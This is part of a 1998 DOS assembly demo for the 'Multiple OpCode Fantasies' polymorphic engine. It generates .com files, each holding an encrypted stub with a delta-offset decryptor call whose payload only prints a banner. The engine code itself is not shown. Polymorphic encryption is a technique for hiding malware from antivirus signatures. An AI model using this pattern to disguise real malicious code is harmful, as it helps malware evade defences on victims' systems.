;`~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,


Start_of_code:
       Call Get_bp
Get_bp:
       Pop bp
       Sub bp, 103h
       Mov ax, Offset End_encr_code
       Db 05h
poly_entry Dw 0
       Sub ax, Offset Start_of_code
       Add ax, 100h
       Call ax

Encr_code:
       Jmp Real_code

text Db 0Ah, 0Dh,' _/\____________________________________________________________________/\_ '
     Db 0Ah, 0Dh,'<<                                                                        >>'
     Db 0Ah, 0Dh,' >> This code is generated by `The Multiple OpCode Fantasies poly engine''<<'
     Db 0Ah, 0Dh,'<</ ~~~~~~~~~~~~~~>> Version 3.0 (c) 1998 by Lord Julus <<~~~~~~~~~~~~~~~\>>'
     Db 0Ah, 0Dh,'                 (________________________________________)', 0ah, 0dh, 0ah, 0dh, '$'

Real_code:
       Push cs
       Pop ds
       Lea dx, text[bp]
       Sub dx, Offset Start_of_code
       Add dx, 100h
       Mov ah, 09h
       Int 21h
       Mov ax, 4C00h
       Int 21h
       Nop
       Nop
End_encr_code:


string        Db 80h Dup('$')
welcome       Db 0Ah, 0Dh,'€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€'
              Db 0Ah, 0Dh,'€ A demo for a Poly Engine...                                                €'
              Db 0Ah, 0Dh,'€ Multiple OpCode Fantasies (M.O.F.) Version 3.0                             €'
              Db 0Ah, 0Dh,'€ written by Lord Julus (C) 1998                                             €'
              Db 0Ah, 0Dh,'€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€'

              Db 0Ah, 0Dh, 0
str1          Db 0Ah, 0Dh, 'How many files to generate (1 - 65,535): ',0
str2          Db 0Ah, 0Dh, 'Please wait...', 0ah, 0dh, 0
str3          Db 0Ah, 0Dh, 'Generating: ',0
str4          Db 0Ah, 0Dh, 0Ah, 0Dh, 'Done generating ! ',0ah, 0dh, 0ah, 0dh, 0
str5          Db 0Ah, 0Dh, 'An error ocured while generating ! ',0ah, 0dh, 0ah, 0dh, 0
filename      Db 'mof'
strnum        Db '00000.com',0,'$'
position      Dw 0
polylen       Equ 2100d
filenums      Dw 0

includelib    asmwiz.lib
Buffer_start:
buffer Db (End_encr_code - Start_of_code + polylen) Dup (0)
bufferlen Equ $ - buffer

Ending:
Cseg          Ends
              End            Main

